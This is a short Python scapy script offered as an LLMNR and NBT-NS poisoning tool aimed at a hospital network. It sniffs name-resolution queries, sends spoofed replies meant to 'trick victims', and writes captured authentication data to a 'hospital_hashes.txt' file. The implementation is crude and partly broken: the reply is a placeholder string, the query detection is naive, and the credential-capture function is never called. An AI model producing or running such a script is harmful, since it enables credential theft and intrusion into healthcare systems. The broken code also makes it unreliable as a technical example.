import scapy.all as scapy
import socket
import sys

# Define the network interface to listen on
INTERFACE = "eth0"

# This script listens for LLMNR and NBT-NS requests on the hospital network
# When a request is detected, it responds with a spoofed reply
# Any authentication attempt is captured and logged

def sniff_requests():
    """Sniff LLMNR and NBT-NS requests on the network"""
    print("[*] Listening for LLMNR and NBT-NS requests...")
    scapy.sniff(filter="udp port 137 or udp port 5355", prn=process_packet, store=False)

def process_packet(packet):
    """Process captured packets and check for LLMNR or NBT-NS requests"""
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        try:
            payload = packet[scapy.Raw].load.decode(errors="ignore")
            if "QUERY" in payload:
                print(f"[!] Detected request for: {payload}")
                send_spoofed_response(packet)
        except Exception as e:
            print(f"[!] Error processing packet: {e}")

def send_spoofed_response(packet):
    """Send a spoofed response to trick victims"""
    try:
        response_packet = scapy.IP(dst=packet[scapy.IP].src) / \
                          scapy.UDP(dport=packet[scapy.UDP].sport) / \
                          scapy.Raw(load="FAKE_RESPONSE")
        scapy.send(response_packet, verbose=False)
        print("[+] Spoofed response sent")
    except Exception as e:
        print(f"[!] Error sending spoofed response: {e}")

def capture_credentials(data):
    """Capture and log authentication attempts"""
    try:
        with open("hospital_hashes.txt", "a") as file:
            file.write(data + "\n")
        print("[+] Captured credentials saved")
    except Exception as e:
        print(f"[!] Error saving credentials: {e}")

def main():
    try:
        print("[*] Starting hospital network LLMNR and NBT-NS poisoning script...")
        sniff_requests()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()